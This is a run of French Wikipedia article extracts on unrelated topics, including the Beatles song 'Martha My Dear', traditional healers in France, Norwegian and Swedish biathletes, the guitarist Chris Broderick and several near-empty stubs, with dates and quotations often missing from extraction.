Les voitures qui ont parcouru moins de 70 % de la distance du vainqueur ne marquent pas de points.
Les écuries qui engagent plusieurs voitures n'inscrivent que les points de leur voiture la mieux classée.
Classement pilotes.
Pour les courses de moins de 3 heures, les points sont accordés selon le barème suivant :
Pour les courses d'une durée de 4 à 8 heures, les points sont accordés selon le barème suivant :
Pour les courses de plus de 8 heures, les points sont accordés selon le barème suivant :
Les équipages qui ont parcouru moins de 70 % de la distance du vainqueur ne marquent pas de points. Pour inscrire des points, un pilote doit avoir conduit pendant au moins ( pour l'épreuve de Long Beach).
Classement LMP1.
† - Frank Biela et Emanuele Pirro ont été pénalisés de 3 points pour avoir causé un accrochage.
Classement LMP2.
† - Sascha Maassen et Patrick Long ont été pénalisés de 3 points pour avoir causé un accrochage.

</doc>
<doc id="2846197" url="https://fr.wikipedia.org/wiki?curid=2846197" title="Coupe du monde de parapente">
Coupe du monde de parapente

Présentation.
La Coupe du monde de parapente est un circuit de compétitions internationales de haut niveau qui se déroule sur plusieurs épreuves chaque année.
Ce circuit a vu le jour en 1992 et est géré par une association à but non lucratif "Paragliding World Cup Association" ou PWCA basée à Marlens (France) dont les membres sont les compétiteurs eux-mêmes.
Chaque compétition dure une semaine et se compose de plusieurs manches quotidiennes qui consistent à parcourir un circuit sur le même principe que les régates en bateau. Le pilote le plus rapide à effectuer le parcours ou celui qui va le plus loin est le vainqueur. Jusqu'en 2008, un classement général était établi tout au long de l'année pour déterminer le vainqueur. Depuis 2009, seule la dernière compétition - la superfinale - compte pour le classement final, les autres compétitions servant à se qualifier pour participer à la superfinale.

</doc>
<doc id="2846200" url="https://fr.wikipedia.org/wiki?curid=2846200" title="Bulgarian Football Union">
Bulgarian Football Union



</doc>
<doc id="2846202" url="https://fr.wikipedia.org/wiki?curid=2846202" title="Guérisseur">
Guérisseur

Un guérisseur, dit aussi médicastre, est une personne, généralement dépourvue de diplôme médical, qui soigne, en dehors de l'exercice légal scientifique de la médecine, par des moyens empiriques ou magiques, en vertu de dons particuliers supposés ou à l'aide de recettes personnelles. Il désigne aussi un saint guérisseur.
Guérisseurs.
. Puis, peu à peu, la médecine s'est éloignée à la fois des croyances spirituelles et du charlatanisme.
Dans le monde occidental, les guérisseurs, héritiers de pratiques ancestrales des sociétés traditionnelles, peuvent être magnétiseur, radiesthésiste, rebouteux, exorciste… Dans les sociétés traditionnelles d'Asie, d'Afrique, d'Amérique, d'Océanie, considérés comme sorciers ou voyants, les guérisseurs sont généralement des chamans. Les guérisseurs des Philippines et du Brésil sont parfois appelés chirurgiens psychiques.
En Suisse, il en existe différentes catégories, les coupe-feu, les faiseurs de secrets, selon les problèmes de santé. Les faiseurs de secrets sont également présents en Vallée d'Aoste, aussi bien que les "rabeilleurs" (équivalent de « rebouteux » en français valdôtain), qui pratiquent des massages pour les distorsions.
France ().
Participant au processus de médicalisation du territoire français, la loi du 19 ventôse (), institue la notion d'exercice illégal de la médecine, plaçant les guérisseurs en tant que concurrents illégaux des médecins. En effet, celle-ci n'autorise à pratiquer la médecine qu'aux personnes détentrices d'un diplôme de médecin, de chirurgien, d'officier de santé et de sage-femme. Il faut également ajouter que ces praticiens d’une médecine empreinte de croyances et de conceptions traditionnelles forment l’essentiel du paysage médical de cette France du XIXe siècle, qui ne compte que près de 25 % de citadins vers 1850. Ils sont donc, dans plusieurs espaces ruraux longtemps dépourvus de médecins reconnus, un des rares recours possibles pour l’obtention de soins, alors que le coût des honoraires des rares docteurs consacre leur importance pour la majorité de la population. 
Cependant, dans les faits, la loi n'est que difficilement appliquée, punissant davantage les personnes se faisant passer pour des médecins que les personnes exerçant illégalement la médecine, ce qui explique la pérennité de différents types de guérisseurs tout au long du .
Les rebouteux.
Nommés adoubeurs en Anjou, renoueurs, bailleuls, remancheurs, rabouteurs, remettoux ou rhabilleurs dans d'autres régions, ils appartiennent à la communauté locale où ils exercent souvent les métiers d'agriculteurs, de bergers, d'éleveurs, de hongreurs ou encore de maréchaux-ferrants. Leurs carrières et leurs connaissances, qu'ils doivent à leurs aînés, leur confèrent une solide expérience dans la réduction des luxations et des fractures. Leurs pratiques basées sur des manœuvres mécaniques pouvaient également prendre la forme de « massages » ou de « pétrissages énergiques ».
Les panseurs de secrets.
Très proches des rebouteux par leur appartenance à la communauté villageoise, ils ne forment parfois qu'un seul et même personnage. Détenteurs d'un ou de plusieurs secrets qui leur ont été légués ou révélés par leurs aînés, ne se sentant plus en capacité d'exercer leur fonction, souvent vers la fin de leur vie, on leur reconnait le don de guérir les maux associés à ces secrets. Leur thérapeutique est surtout basée sur la récitation de prières associées à des gestes notamment empruntés à la religion catholique.
Les charlatans.
Cette catégorie constituée de marchands itinérants s'adonnent surtout à la vente de remèdes mais proposent également des manœuvres « médicales » basées sur des procédés qu'ils empruntent à d'autres types de guérisseurs, pratiquent la voyance et comblent un manque dans des domaines délaissés par la médecine officielle tel que l'art dentaire ou encore l'ophtalmologie. « Voyageant parfois en groupe, précédés assez souvent d'affiches prometteuses, ils installent leurs tréteaux sur la place du village, dans les carrefours des villes, au moment des foires et des marchés, venant à la rencontre d'une clientèle rassemblée qu'ils amusent par la séduction tapageuse d'une réclame insistante ».
Les religieux.
Proches des malades du fait de l'exercice de charité dont ils doivent faire preuve, ils occupent depuis longtemps une place centrale dans la préparation de remèdes, qu'ils apportent souvent gratuitement aux malades et qu'ils accompagnent de quelques conseils et de prières. Cependant, il arrive également qu'ils s'adonnent au commerce de médicaments qui proviennent souvent de leur propre fabrication.

</doc>
<doc id="2846203" url="https://fr.wikipedia.org/wiki?curid=2846203" title="Érasme de Rotterdam">
Érasme de Rotterdam



</doc>
<doc id="2846206" url="https://fr.wikipedia.org/wiki?curid=2846206" title="Martha My Dear">
Martha My Dear

 est une chanson des Beatles écrite et composée par Paul McCartney, et signée Lennon/McCartney. Enregistrée aux studios Trident de Londres les 4 et , elle est publiée sur l'album "The Beatles" le au Royaume-Uni et trois jours plus tard aux États-Unis sous le label Apple. " est écrite dans un contexte difficile pour le groupe, au sein duquel de nombreuses tensions sont apparues depuis la fin de son séjour en Inde.
L'enregistrement de la trentaine de chansons de lAlbum blanc" se passe mal, au point que l'ingénieur du son Geoff Emerick démissionne de son poste et que les disputes entre les musiciens sont de plus en plus récurrentes. Ce climat renforce les individualités de chacun, ce qui pousse Paul McCartney à écrire et composer certaines chansons sans l'aide de son partenaire John Lennon. C'est le cas de ' : McCartney se présente sans les trois autres Beatles aux studios Trident et assure l'enregistrement du chant et de tous les instruments traditionnels du groupe, aidé par George Martin et un orchestre de quatorze musiciens.
Le titre de la chanson s'inspire de la chienne bobtail de McCartney, prénommée Martha, mais les paroles font également référence à son expérience personnelle amoureuse et à une liaison extra-conjugale d'un membre de sa famille. Aucun des trois autres Beatles n'apporte sa contribution à la chanson, qui se révèle être un défi technique pour McCartney, en raison de la partition complexe au piano qui comprend des sonorités inspirées du music-hall. Comme de nombreuses chansons du groupe, " fait l'objet de reprises par plusieurs musiciens.
Genèse.
Contexte.
En 1967, les Beatles consacrent exclusivement leur temps de travail au studio d'enregistrement. Le groupe cesse en effet les tournées en après un ultime concert au à San Francisco, à la suite d'une lassitude générale. John Lennon déclare à propos de leur dernière représentation : . Libéré de toute contrainte des tournées, le groupe met à profit le temps disponible pour produire l'album expérimental ', considéré comme un immense succès critique et commercial. Deux mois plus tard, le manager des Beatles Brian Epstein est retrouvé mort à son domicile à la suite d'une overdose, ce qui anéantit le moral des musiciens. déclare Ringo Starr. Malgré ce contexte éprouvant, les Beatles enregistrent ' et tournent le film associé. Si l'album est une réussite commerciale malgré un démarrage difficile, le film fait face à de nombreuses critiques négatives.
En , les Beatles ressentent le besoin de se détacher des contraintes liées à leur célébrité. remarque Paul McCartney. George Harrison s'intéresse à la culture et musique indiennes ainsi qu'à la méditation transcendantale, et propose ainsi à ses camarades d'effectuer un séjour en Inde afin de suivre les cours de Maharishi Mahesh Yogi sur ce concept. Dès lors, le groupe vit au rythme de la communauté de la centaine de personnes qui participe au voyage, en pratiquant la méditation et jouant de la musique. À leur retour, les Beatles écrivent une trentaine de chansons acoustiques qu'ils souhaitent publier sur un nouvel album. Le concept du disque est à l'opposé de ce que le groupe a proposé avec "". Les Beatles souhaitent en effet proposer un son plus rock, moins sophistiqué, et une pochette d'album sobre.
Écriture et composition.
Bien que les Beatles aient été musicalement productifs durant leur séjour en Inde, "" ne fait pas partie de la liste des chansons écrites durant cette période. En effet, aucun clavier ni piano n'est présent durant le voyage ; Paul McCartney n'a pas la possibilité de composer la chanson sur place. La chanson est écrite trois jours avant que Paul McCartney n'investisse les studios Trident de Londres pour son enregistrement. Paul McCartney écrit et compose seul le titre alors qu'il est au piano. déclare le musicien.
À la suite de cet exercice technique, les premiers mots qui viennent au chanteur sont "". George Harrison fait part de son incompréhension à McCartney face à l'invention de ce personnage. remarque Paul McCartney. Le chanteur s'inspire de sa chienne de race bobtail prénommée Martha, âgée de deux ans. McCartney se remémore le caractère de l'animal, qui plaît particulièrement à John Lennon, qui lui donne l'idée de ce personnage. finit-il par conclure. En plus du piano, McCartney souhaite la présence d'instruments à cordes et à vents pour embellir la chanson ; il confie ainsi à George Martin une démo que le producteur retravaille hâtivement.
Enregistrement.
Le , les Beatles investissent les studios EMI de Londres pour débuter l'enregistrement de leur important travail de composition en Inde. La présence de Yoko Ono, qui accompagne John Lennon, fait naître de vives tensions entre elle et les musiciens. Geoff Emerick, l'ingénieur du son, travaille dans un climat de . Exaspéré par l'ambiance délétère de certaines séances, Emerick claque la porte des studios en annonçant au producteur George Martin : . La plupart des sessions d'enregistrement sont en effet de plus en marquées par l'individualisme des quatre musiciens, qui apportent de moins en moins leur contribution sur les chansons de leurs camarades. Ainsi, Lennon déteste ouvertement travailler sur "", une composition du bassiste, tandis que Paul McCartney n'apprécie pas d'enregistrer "Revolution 9", que le groupe répète inlassablement. Ringo Starr quitte provisoirement les Beatles fin août, lassé par les nombreuses tensions, et le groupe, réduit à trois membres, délaisse les studios EMI pour les studios Trident. Après son retour le , la formation alterne les séances de travail entre les deux studios.
L'enregistrement de ' se fait dans cet d'esprit d'individualité, puisque aucun des trois autres musiciens n'apporte sa contribution à la chanson de Paul McCartney. Ce dernier se présente sans ses camarades au sein des studios Trident le . Barry Sheffield est l'ingénieur du son, George Martin officie en tant que producteur et chef d'orchestre. En effet, quatorze musiciens professionnels sont présents pour travailler sur la chanson selon le souhait de McCartney, et sont supervisés par Martin. L'enregistrement de ' débute à et se poursuit toute la nuit jusqu'à . Une seule prise est réalisée, puis retravaillée à l'aide de la technique du re-recording. Paul McCartney assure seul la partie de chant, de piano, de batterie et ajoute des claps de mains. Le lendemain, une partie de guitare et de basse sont ajoutées, également jouées par McCartney, et le mixage audio est effectué dans la même journée.
Caractéristiques artistiques.
Musique et paroles.
' est issue de la collaboration musicale entre Paul McCartney, qui joue tous les instruments traditionnels du groupe, et George Martin, qui dirige l'orchestre. La formation classique du producteur a déjà permis aux deux hommes de travailler sur deux chansons à succès de McCartney, ' et ', qui comportent des parties de violon, d'alto et de violoncelle. Les quatorze musiciens présents sur ' sont quatre violonistes, deux altistes, deux violoncellistes, trois trompettistes, un tromboniste, un joueur de cor d'harmonie et de tuba. La chanson comporte une introduction, deux couplets avec chant, un couplet instrumental et deux ponts. La structure rythmique comprend des mesures en , et et un tempo autour de 90 bpm.
Selon le musicologue Alan Pollack, "" comporte des accords aux influences jazz et blues. Elle débute par une introduction au piano sur un accord de mi bémol majeur, suivi du premier couplet où Paul McCartney entame le chant. La partition de piano est relativement complexe, avec de nombreux accords aux influences music-hall. Les arrangements orchestrés par George Martin sont tantôt discrets, pour mettre en valeur la partition de piano pour les cordes, tantôt appuyés sur chaque pulsation pour les cuivres lors des ponts. La batterie, la guitare électrique et la basse font leur apparition à la fin du premier pont. Le pont instrumental comprend une partition de trompette, rythmée par les clappements de mains qui prennent le dessus sur la batterie. La ligne de basse est davantage mise en valeur jusqu'à la fin du dernier couplet, tandis que la chanson se termine par une partie de cordes.
Plusieurs niveaux de lecture sont possibles quant à l'interprétation des paroles. Bien que Paul McCartney ait été inspiré par sa chienne Martha pour le titre, celui-ci affirme que les vers ne lui sont pas destinés. L'auteur emploie en effet les termes ("") et () à plusieurs reprises. Selon Steve Turner, la chanson serait et pourrait être destinée à Jane Asher. Le couple est pourtant déjà séparé depuis plus de trois mois lorsque la chanson est écrite et Paul McCartney fréquente déjà Linda Eastman. Paul McCartney admet par ailleurs que la chanson s'inspire en partie d'une liaison extraconjugale d'un membre de sa famille. Cette personne, dont l'identité n'est pas connue, s'est en effet confiée au chanteur avant l'écriture du morceau. , finit-il par conclure.
Parution et réception.
Publication.
' est publiée sur l'album ' le au Royaume-Uni et trois jours plus tard aux États-Unis sous le label Apple. La chanson figure sur la face B du disque . Paul McCartney est satisfait du travail réalisé sur sa chanson et donne une interview au "" une semaine après la sortie de l'album, dans laquelle il parle du titre. , déclare t-il.
Il ajoute, en plaisantant, qu'il lors d'une interview sur "Radio Luxembourg". Ses déclarations entretiennent l’ambiguïté sur la signification des paroles auprès du public, qui pense qu'elles sont réellement destinées à sa chienne Martha. McCartney avoue près de trente ans plus tard que seul le titre rend hommage à sa chienne et non les paroles.
Accueil critique.
L'accueil réservé à l'album ' est mitigé, les critiques d'époque le comparant avec le succès de '. Alan Walsh, du ', écrit notamment le : . Plus récemment, "Rolling Stone" souligne l'individualité du travail des musiciens sur l'album dans un esprit . Le magazine écrit notamment que ' est et ajoute que le titre .
"Rock &amp; Folk" considère que ' est et compare ' à . Le site ' met également en avant le côté burlesque de la chanson et ses influences music-hall, soulignant que McCartney a une affection particulière pour le vaudeville, et que son père, Jim McCartney, a joué ce type de musique au sein de son groupe. Enfin, à l'occasion des cinquante ans de la sortie de lAlbum blanc", le magazine ' classe ' vingtième sur la liste des meilleures chansons de l'album, la qualifiant .
Postérité et reprises.
À l'occasion de la réédition de tous les albums des Beatles en format CD, "" est republiée en 1987. La chanson figure également sur l'édition spéciale publiée à l'occasion du cinquantième anniversaire de la sortie du double album en 2018. Celui-ci occupe la deuxième place des classements britanniques et la cinquième au "Billboard 200".
Comme la plupart des chansons des Beatles, "" bénéficie de plusieurs reprises. Dès 1969, le groupe Slade publie l'album "Beginnings" dans lequel figure une version de la chanson, jugée négativement par la critique musicale.
En 1997, Fools Garden enregistre également une reprise du titre dans un registre rock sur l'album '. Enfin, le pianiste de jazz Brad Mehldau publie une version instrumentale de ' sur l'album "", paru en 2005. La chanson contient une partition de piano plus complexe que celle de Paul McCartney, et est considérée comme par la critique.

</doc>
<doc id="2846209" url="https://fr.wikipedia.org/wiki?curid=2846209" title="Chris Broderick">
Chris Broderick

Chris Broderick, né le à Lakewood dans le Colorado, est un guitariste de metal. Ancien guitariste du groupe Jag Panzer, il participe aux quatre albums studio du groupe avant de remplacer Glen Drover au sein de Megadeth. Aussi, entre 2001 et 2007, il est guitariste de tournée pour Nevermore ainsi que pour In Flames depuis 2019. Il intègre In Flames à nouveau pour leur tournée Européenne 2024
Début de carrière.
Broderick commence à jouer de la guitare à l'âge de 11 ans, ayant un style de jeux éclectique allant du RnB à la pop, du classique au jazz. Broderick s'entraina selon lui jusqu'à 14 heures par jour, se levant tôt le matin pour jouer 5 heures de guitare électrique, ensuite 5 heures de guitare classique, 2 heures de piano et enfin 2 heures de violon.
Il obtient son diplôme en guitare classique à l'université de Denver.
Jag Panzer (1997-2008).
En 1997, le guitariste de Jag Panzer décide de quitter le groupe, posant un problème pour le groupe puisque celui-ci avait un jeu de guitare complexe et très technique. C'est alors que Chris Broderick fut approché par Jag Panzer. Broderick participa aux quatre albums studio suivants du groupe.
Nevermore (2001-2003, 2006-2007).
Broderick ne fut jamais vraiment un membre à part entière du groupe, ne participant qu'aux concerts du groupe. Après une pause de trois ans, les membres de Nevermore demandèrent à Broderick de repartir en tournée avec eux, avant qu'il ne rejoigne Megadeth.
Megadeth (2008-2014).
Fin 2007, après bon nombre de rumeurs de départ, Glen Drover quitte le groupe. Son frère Shawn Drover, batteur du groupe, pense directement à Chris Broderick pour le remplacer, et montre à Dave Mustaine des vidéos de Broderick jouant de la guitare électrique et classique. Deux semaines plus tard, Broderick devient officiellement le nouveau guitariste de Megadeth, faisant son premier concert avec le groupe en Finlande. Broderick déclara que du fait de son implication avec le groupe, il ne pourrait plus faire partie de Nevermore et de Jag Panzer.
En 2009, le groupe sort l'album "Endgame".
En 2011, le novembre, le groupe sort l'album "Thirteen".
En 2013, le , le groupe sort l'album "Super Collider".
Le , peu après l'annonce de séparation de Shawn Drover, il annonce à son tour sa séparation avec Megadeth, à la suite de différences artistiques et musicales avec le groupe.
Act of Defiance (2014-2018).
Apres leur départ de Megadeth, Chris Broderick et Shawn Drover, forment Act of Defiance avec Henry Derek et Matt Bachand.
Discographie.
Jag Panzer.
The Age of Mastery (1998)
Thane to the Throne (2000)
Mechanized Warfare (2001)
The Era of Kings and Conflict (2002)
Casting the Stones (2004)
Nevermore.
The Year of the Voyager (2008)
Megadeth.
Endgame (2009)
Rust in Peace Live (2010)
The Big 4 Live from Sofia, Bulgaria (2010)
Thirteen (2011)
Super Collider (2013)
Countdown to Extinction: Live (2013)
Act of Defiance.
Birth and the Burial (2015)

</doc>
<doc id="2846213" url="https://fr.wikipedia.org/wiki?curid=2846213" title="Tue-vaques">
Tue-vaques



</doc>
<doc id="2846222" url="https://fr.wikipedia.org/wiki?curid=2846222" title="BFU">
BFU

BFU peut faire référence à :

</doc>
<doc id="2846223" url="https://fr.wikipedia.org/wiki?curid=2846223" title="Bfu">
Bfu



</doc>
<doc id="2846238" url="https://fr.wikipedia.org/wiki?curid=2846238" title="Bfv">
Bfv



</doc>
<doc id="2846241" url="https://fr.wikipedia.org/wiki?curid=2846241" title="Record of the Bahamut War">
Record of the Bahamut War

 est un jeu vidéo de type "wargame" sorti en 1991 sur Mega Drive. Le jeu a été développé et édité par Sega. Il est sorti uniquement au Japon.
Il est disponible sur la console virtuelle de la Wii.

</doc>
<doc id="2846243" url="https://fr.wikipedia.org/wiki?curid=2846243" title="Bahamut Senki">
Bahamut Senki



</doc>
<doc id="2846247" url="https://fr.wikipedia.org/wiki?curid=2846247" title="Boême">
Boême



</doc>
<doc id="2846248" url="https://fr.wikipedia.org/wiki?curid=2846248" title="Stade Mané Garrincha">
Stade Mané Garrincha

Stade Mané Garrincha peut désigner, au Brésil : 

</doc>
<doc id="2846252" url="https://fr.wikipedia.org/wiki?curid=2846252" title="Lake George (New York)">
Lake George (New York)



</doc>
<doc id="2846253" url="https://fr.wikipedia.org/wiki?curid=2846253" title="Silver Bay">
Silver Bay

Silver Bay peut faire référence à :

</doc>
<doc id="2846261" url="https://fr.wikipedia.org/wiki?curid=2846261" title="Rhythm Devils">
Rhythm Devils

Le Rhythm Devils est un groupe fondé par les batteurs Bill Kreutzmann et Mickey Hart du groupe Grateful Dead.
Origines.
Dans la plupart des concerts du Grateful Dead à partir du milieu des années 1970, il existe un long morceau d'improvisation de batteries, dans la deuxième partie des concerts. Cette tradition se prolongea jusqu'au dernier concert Grateful Dead en 1995.
À cette improvisation, les fans du groupe (les Deadhead) ont donné le nom de "Drums" ou de "Rhythm Devils".
Après 1979, il est suivi par une autre improvisation prolongée du reste du groupe, habituellement sans batteurs, appelée "Space" . On trouve des exemples caractéristiques de cet enchaînement dans l'album Deadset
Cette improvisation est réalisée par Bill Kreutzmann et Mickey Hart parfois accompagné par des invités.
Dans le vocabulaire des fans du groupe, le terme "Rhythm Devils" s'applique aussi au duo Bill Kreutzmann-Mickey Hart.
Les musiciens.
La formation est composée des batteurs Kreutzmann, Hart, du bassiste Mike Gordon du groupe Phish, du guitariste Steve Kimock, avec le percussionniste Sikiru Adepoju et la chanteuse Jen Durkin (ancienne de Deep Banana Blackout).
Les activités du groupe.
Le duo du Rhythm Devils avait été recruté par le réalisateur Francis Ford Coppola pour enregistrer la bande sonore au de "Apocalypse Now". En 1979 et 1980, Bill Kreutzmann et Mickey Hart, avec d'autres percussionnistes, ont enregistré les sessions dans les studios du Grateful Dead dans le comté de Marin et chez Mickey Hart à Novato.
Le groupe a été formé pendant l'été 2006 et a réalisé des tournées aux États-Unis.
Le groupe joue des chansons originales écrites par l'ancien parolier du Grateful Dead, Robert Hunter comme "Fountains of Wood", "The Center", et "Who Do You Think You Are" et des chansons du Grateful Dead comme The Other One, "Fire On The Mountain", "Cumberland Blues", "Loose Lucy" "Scarlet Begonias", "U.S. Blues" et "Sugaree".

</doc>
<doc id="2846270" url="https://fr.wikipedia.org/wiki?curid=2846270" title="BFW">
BFW

BFW peut faire référence à :

</doc>
<doc id="2846272" url="https://fr.wikipedia.org/wiki?curid=2846272" title="Bfw">
Bfw



</doc>
<doc id="2846276" url="https://fr.wikipedia.org/wiki?curid=2846276" title="BFX">
BFX



</doc>
<doc id="2846277" url="https://fr.wikipedia.org/wiki?curid=2846277" title="Bafoussem">
Bafoussem



</doc>
<doc id="2846279" url="https://fr.wikipedia.org/wiki?curid=2846279" title="Julie Bonnevie-Svendsen">
Julie Bonnevie-Svendsen

Julie Bonnevie-Svendsen, né le à Nittedal, est une biathlète norvégienne. Elle se retire du sport à 23 ans.
Biographie.
Évoluant dans les catégories juniors, elle est annoncée comme un espoir important en Norvège, montang sur un podium de la Coupe d'Europe junior en novembre 2004 à Geilo. Son frère Martin est aussi biathlète.
Remportant notamment deux médailles d'or au Festival olympique de la jeunesse européenne en 2005, Julie Bonnevie-Svendsen fait sa première apparition en Coupe du monde en à l'occasion d'un individuel organisé à Hochfilzen (Autriche), devenant la plus jeune biathlète norvégienne dans l'équipe nationale depuis Ole Einar Bjørndalen. Dès cette première course et malgré deux fautes au tir, la Norvégienne marque ses premiers points grâce à une quinzième place finale. Aux Championnats du monde junior 2006, elle est notamment quatrième du sprint. C'est lors de la saison 2007-2008 qu'elle obtient une place régulière dans l'équipe nationale norvégienne, à la suite de ses bons résultats lors des Championnats du monde juniors 2007 disputés à Val Martello, où elle finit notamment troisième du relais avec la sélection norvégienne. Plus encore, la jeune biathlète est sélectionnée pour les Mondiaux 2008 disputés à Östersund, même si elle a été malade auparavant. Elle y obtient la deuxième meilleure performance de sa carrière en terminant huitième du sprint, alors qu'elle perdu du temps à cause d'une erreur de parcours, puis est seizième de la poursuite et se qualifie alors pour la mass start, se classant . Elle termine finalement la saison à la finale du classement général pour sa première saison complète parmi l'élite mondiale.
Lors de la deuxième étape de la saison 2008-2009 à Hochfilzen, elle monte sur son premier et seul podium en Coupe du monde en faisant partie du relais gagnant, avec Solveig Rogstad, Ann Kristin Flatland et Tora Berger. En 2009, elle est septième d'une poursuite à Trondheim, ce qui restera son meilleur résultat dans l'élite et signe deux autres 
résultats dans le top dix, ce qui la mène vers son meilleur classement général en fin de saison, . Elle aussi en forme sur les Championnats de Norvège, remportant le sprint et la poursuite. La biathlète souffre cependant d'une grande fatigue et est même bannie de l'entraînement au mois de juillet par l'entraîneur Berland, avant de revenir au mois d'août.
La Norvégienne termine sa carrière internationale en 2011, étant malade lors de la saison 2009-2010, où son seul moment fort est une victoire sur l'IBU Cup à Obertilliach. Elle prolonge la série des athlètes norvégiennes qui prennent leur retraite sportive de manière précoce, comme Linda Grubben avant elle, alors qu'elle était considérée comme un des plus grands talents que le biathlon norvégien a jamais eu. Dans sa nouvelle carrière, elle devient ingénieure en orthopédie.

</doc>
<doc id="2846285" url="https://fr.wikipedia.org/wiki?curid=2846285" title="Bfx">
Bfx



</doc>
<doc id="2846310" url="https://fr.wikipedia.org/wiki?curid=2846310" title="Kabardes">
Kabardes

 
Les Kabardes sont un peuple de Ciscaucasie, voisins des Balkars au sud, et des Ossètes à l'est et au sud-est. Ils sont considérés comme des descendants de la branche orientale des Adyguéens, bien que leur langue, le kabarde, apparaisse assez différente.
Les Kabardes sont environ dont en république autonome de Kabardino-Balkarie (Russie), le reste en Géorgie et en Turquie (plateau de Uzunyayla, dans la province de Kayseri). Ils sont établis dans le Caucase depuis le de notre ère. Ils sont en grande majorité musulmans sunnites, mais certains vivant dans le district de Mozdok (Ossétie du Nord-Alanie) sont chrétiens orthodoxes.

</doc>
<doc id="2846323" url="https://fr.wikipedia.org/wiki?curid=2846323" title="Krasnozavodsk">
Krasnozavodsk

Krasnozavodsk (en , littéralement ) est une ville de l'oblast de Moscou, en Russie, dans le raïon Serguievo-Possadski. Sa population s'élevait à habitants en 2017.
Géographie.
Krasnozavodsk est arrosée par la rivière Kounia, un affluent de la Doubna, et se trouve à au nord-est de Moscou.
Histoire.
Krasnozavodsk a été fondée en 1915 pour le personnel d'une nouvelle usine de construction mécanique. À l'origine, la localité n'avait aucun nom. Après 1917, elle fut appelée Vozrojdenie (, ou « Renaissance »), puis Zagorski (), en raison de la proximité de la ville qui portait alors ce nom, et enfin Krasnozavodski (). En 1940, la localité est devenue la ville de Krasnozavodsk. En 1999, une partie du territoire de Krasnozavodsk en a été séparée pour former une nouvelle entité : la ville de Peresvet.
A sept kilomètres au nord de Krasnozavodsk se trouve Bogorodskoïe, connu comme le centre d'un vieil artisanat populaire, jouets et sculptures en bois tendre.
Économie.
La principale entreprise de la ville est l'usine Krasnozavodski Khimitcheski Zavod (en ), en abrégé KKhZ, fondée en 1915 et qui fabrique des cartouches de marque « Record ».
Population.
Recensements (*) ou estimations de la population

</doc>
<doc id="2846325" url="https://fr.wikipedia.org/wiki?curid=2846325" title="Pierre Grognet">
Pierre Grognet

Pierre Grognet ou Pierre Grosnet est un ecclésiastique et un poète français, né à Toucy vers 1460 et mort aux environs de 1540.
Biographie.
Dans sa requête au prévôt de Paris, pour l'impression de ses " Mots dorés de Caton", il se qualifie de . Souvent rapproché de Roger Collerye qui réside également à Auxerre, Pierre Grognet est un écrivain prolifique.
Il est connu pour avoir composé deux recueils :
Il est aussi l'auteur de
Dans son ouvrage "Recollection" Pierre Grognet conte des histoires de la vie courante, tels que les périodes de gel, des mises à mort comme celles de Jean Langlois ou d'Edmond de La Fosse pour avoir profané des hosties.
Jean Langlois (prêtre).
Le vendredi , un prêtre natif d'Ivry-sur-Seine nommé Jean Langlois, étant entré dans l'église Notre-Dame pendant la messe, arracha la Sainte Hostie des mains d'un prêtre qui disait la messe dans la nef et la piétina.
Prêtre, considéré comme hérétique, Jean Langlois est condamné et brûlé vif, place aux Pourceaux.
Voici la poésie de Pierre Grognet contant ce fait :

</doc>
<doc id="2846326" url="https://fr.wikipedia.org/wiki?curid=2846326" title="Sofia Domeij">
Sofia Domeij

Sofia Domeij, née le à Hudiksvall, est une biathlète et fondeuse suédoise retraitée depuis 2011.
Biographie.
Sofia Someij commence sa carrière sportive dans le ski de fond en 1996. Elle prend part ensuite à la Coupe du monde de temps en temps, se classant au mieux quinzième d'une épreuve de sprint à Borlänge.
Elle fait ses débuts en Coupe du monde de biathlon en novembre 2005 à Östersund. Elle marque ses premiers points quelques semaines plus tard à Ruhpolding grâce à une place. Pour ses premiers championnats du monde en 2007, elle décroche une place en sprint. 
En 2008, elle obtient son meilleur résultat individuel dans l'élite avec une dixième place au sprint de Pyeongchang. Finalement, elle monte sur le podium en sur un relais disputé à Ruhpolding.
Aux Jeux olympiques d'hiver de 2010, il se classe quarantième du sprint et de la poursuite.
Elle annonce la fin de sa carrière sportive en , après plusieurs problèmes physiques.
Palmarès en biathlon.
Jeux olympiques.
Légende :
— : n'a pas participé à l'épreuve

</doc>
<doc id="2846328" url="https://fr.wikipedia.org/wiki?curid=2846328" title="Anna Maria Nilsson">
Anna Maria Nilsson

Anna-Maria Uusitalo, née Nilsson le à Östersund, est une biathlète suédoise. 
Biographie.
Anna-Maria Nilsson démarre le biathlon au niveau international à l'occasion des Championnats du monde junior 2002. L'an suivant, elle monte sur son premier podium dans la Coupe d'Europe junior à Ål.
En 2004, elle connaît l'honneur de sa première sélection en Coupe du monde à Östersund, sa ville natale. C'est lors de la saison 2006-2007, que Nilsson marque ses premiers points, étant du sprint de Ruhpolding puis de l'individuel des Championnats du monde. En 2007-2008, elle fait partie du relais arrivant troisième à Hochfilzen, son premier podium en Coupe du monde. Lors de l'étape suivante à Pokljuka, elle rentre pour la première fois dans le top 10 d'une course individuelle en se classant deux fois sixième (individuel et sprint).
En , elle se retrouve sur la plus haute marche du podium lors du relais de Ruhpolding avant de participer aux Jeux olympiques de Vancouver, où elle est du sprint, de la poursuite, de l'individuel, de la mass start et du relais.
Décrochant finalement son premier podium individuel de Coupe du monde à l'individuel d'Östersund en fin d'année 2011, elle prend sa retraite sportive à l'issue de l'hiver. Elle devient ensuite capitaine de l'équipe handisport de ski de fond avec son partenaire Fredrik Uusitalo.
Elle est la sœur de Mattias Nilsson, également biathlète de haut niveau.

</doc>
<doc id="2846329" url="https://fr.wikipedia.org/wiki?curid=2846329" title="Rent a Hero">
Rent a Hero

 est un jeu vidéo de rôle sorti en 1991 sur Mega Drive. Le jeu a été développé par Sega-AM2 et édité par Sega. Il est sorti uniquement au Japon.
Il est aussi disponible sur la console virtuelle de la Wii.

</doc>
<doc id="2846330" url="https://fr.wikipedia.org/wiki?curid=2846330" title="Rent-A-Hero">
Rent-A-Hero



</doc>
<doc id="2846332" url="https://fr.wikipedia.org/wiki?curid=2846332" title="Rétention">
Rétention

Le mot rétention possède plusieurs significations :
Conservation de clients, de substances ou d'autres éléments non forcément matériels :
En économie et en marketing : conservation de clients (l'opposé de l'attrition).
En assurance : la rétention désigne la part d'un risque qu'un assureur ou un réassureur choisit de conserver à sa charge.
En droit :

</doc>
<doc id="2846339" url="https://fr.wikipedia.org/wiki?curid=2846339" title="1961 en Suisse">
1961 en Suisse

Chronologie de la Suisse
Évènements.
Janvier.
 Vendredi 6 janvier 
 Samedi 21 janvier 
Février.
 Jeudi 9 février 
 Dimanche 10 février 
 Dimanche 19 février 
 Mardi 21 février 
Mars.
